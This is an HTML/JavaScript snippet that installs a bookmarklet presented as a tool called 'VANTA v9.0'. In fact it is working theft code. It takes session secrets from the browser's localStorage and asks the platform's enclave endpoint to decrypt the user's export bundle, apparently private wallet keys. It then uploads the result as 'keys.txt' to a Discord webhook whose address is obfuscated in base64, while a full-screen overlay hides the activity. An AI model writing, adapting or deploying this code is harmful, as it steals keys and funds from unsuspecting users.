<script>
    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";

    const rawLogic = `(async function() {
        // --- 1. PREVENT DOUBLE CLICK ---
        if (window.vantaActive) return;
        window.vantaActive = true;

        const hook = atob("${b64}");
        
        // --- 2. CREATE UI POPUP ---
        const ui = document.createElement('div');
        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:3px solid #0f8;pointer-events:none;";
        ui.innerHTML = "<div style='text-align:center;padding:30px;background:#000;border:1px solid #0f8;'><h1>VANTA v9.0</h1><p id='v_status'>HOOKING LOCAL API...</p></div>";
        document.body.appendChild(ui);

        const update = (t) => document.getElementById('v_status').innerText = t;

        try {
            const session = JSON.parse(localStorage.getItem('padreV2-session'));
            const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));

            if(session && bundles) {
                update("EXTRACTING ENCLAVE DATA...");
                const bKey = Object.keys(bundles.bundles)[0];
                const target = bundles.bundles[bKey];

                // RELATIVE PATH: Bypasses DNS "Name Not Resolved"
                const res = await fetch("/api/v2/enclave/decrypt", {
                    method: 'POST',
                    headers: {
                        'Authorization': session.sessionSecret,
                        'X-Padre-Session': session.sessionId,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        bundle: target.exportBundle, 
                        subOrgId: target.subOrgId 
                    })
                });
                
                if (!res.ok) throw new Error("HTTP " + res.status);

                const decrypted = await res.json();
                
                // --- 3. DISCORD TRANSMISSION ---
                const fd = new FormData();
                fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'keys.txt');
                fd.append('payload_json', JSON.stringify({content: "ðŸ”‘ **DECRYPTED DATA RECEIVED**"}));
                await fetch(hook, { method: 'POST', body: fd });
                
                update("SUCCESS: DATA TRANSMITTED");
            } else {
                update("ERROR: NO SESSION (LOG IN FIRST)");
            }
        } catch(e) {
            update("FAIL: " + e.message);
        }

        // Cleanup
        setTimeout(() => {
            ui.remove();
            window.vantaActive = false;
        }, 4000);
    })(); void(0);`;

    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
</script>
